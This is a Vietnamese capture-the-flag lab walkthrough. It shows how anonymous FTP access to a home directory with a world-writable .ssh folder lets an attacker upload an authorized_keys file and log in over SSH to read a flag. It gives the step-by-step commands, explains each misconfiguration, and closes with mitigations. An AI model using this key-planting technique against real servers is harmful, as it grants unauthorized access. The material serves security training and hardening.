# 🔓 Flow Khai Thác Lab FTP-to-SSH

## 📋 Tổng Quan

Flow này mô tả các bước khai thác và nguyên nhân của từng hành động trong lab FTP-to-SSH Exploit.

---

## 🎯 Flow Khai Thác

### 1. Kết nối FTP với anonymous login
**(Nguyên nhân: FTP server cho phép anonymous access không cần password)**
```
ftp ftp-ssh-server
> user anonymous
> (password: để trống)
```

### 2. Liệt kê files trong thư mục
**(Nguyên nhân: FTP root được map vào /home/dev01 với permissions 755 - listable by everyone)**
```
ftp> ls
```

**Kết quả:** Thấy `README.txt`, `flag.txt`, `.ssh`

### 3. Đọc file README.txt để biết tên user
**(Nguyên nhân: File README.txt có permissions 644 - readable by everyone)**
```
ftp> get README.txt
```

**Kết quả:** Biết user là `dev01`

### 4. Thử đọc flag.txt (thất bại)
**(Nguyên nhân: Flag có permissions 640 - chỉ owner/group đọc được, FTP user không có quyền)**
```
ftp> get flag.txt
```

**Kết quả:** `550 Permission denied`

### 5. Vào thư mục .ssh
**(Nguyên nhân: Thư mục .ssh có permissions 777 - writable by everyone)**
```
ftp> cd .ssh
```

### 6. Tạo SSH key pair
**(Nguyên nhân: SSH server chỉ chấp nhận key-based authentication, cần public key để đăng nhập)**
```bash
ssh-keygen -t rsa -f exploit_key -N ""
```

### 7. Upload public key vào .ssh/authorized_keys
**(Nguyên nhân: Thư mục .ssh writable (777) và SSH StrictModes bị tắt, cho phép upload authorized_keys)**
```
ftp> put exploit_key.pub authorized_keys
```

### 8. SSH vào server với private key
**(Nguyên nhân: SSH server đọc authorized_keys từ .ssh directory, cho phép đăng nhập với matching private key)**
```bash
ssh -i exploit_key dev01@ftp-ssh-server
```

### 9. Đọc flag.txt
**(Nguyên nhân: Đã có quyền của user dev01, flag.txt có permissions 640 - readable by owner)**
```bash
cat /home/dev01/flag.txt
```

**Kết quả:** `FLAG{<sha1_hash>}`

---

## 🔍 Tóm Tắt Nguyên Nhân Lỗ Hổng

| Hành Động | Nguyên Nhân |
|-----------|-------------|
| **Anonymous FTP login** | `anonymous_enable=YES` trong vsftpd.conf |
| **FTP root = /home/dev01** | `anon_root=/home/dev01` - misconfiguration |
| **Thấy flag nhưng không đọc được** | Flag có permissions 640, FTP user không có quyền |
| **Upload vào .ssh được** | Thư mục .ssh có permissions 777 (writable by everyone) |
| **SSH chấp nhận key** | SSH StrictModes bị tắt (`StrictModes no`) |
| **Đọc flag thành công** | Có quyền của user dev01 (owner của flag) |

---

## ⚠️ Các Lỗ Hổng Chính

1. **Anonymous FTP với write permission** → Cho phép upload files
2. **FTP root mapped vào home directory** → Tiếp cận thư mục nhạy cảm
3. **.ssh directory writable by everyone** → Upload authorized_keys được
4. **SSH StrictModes disabled** → SSH không kiểm tra permissions của .ssh
5. **Flag permissions 640** → Chỉ owner/group đọc được, tạo động lực khai thác

---

## 🛡️ Cách Phòng Chống

1. ❌ **Disable anonymous FTP** hoặc **disable write permission**
2. ❌ **Không map FTP root vào home directory**
3. ✅ **Set .ssh permissions 700** và **authorized_keys 600**
4. ✅ **Enable SSH StrictModes** (`StrictModes yes`)
5. ✅ **Sử dụng proper file permissions** (principle of least privilege)

---

**Flow này minh họa cách kết hợp nhiều lỗ hổng nhỏ để đạt được mục tiêu cuối cùng: đọc flag file.**

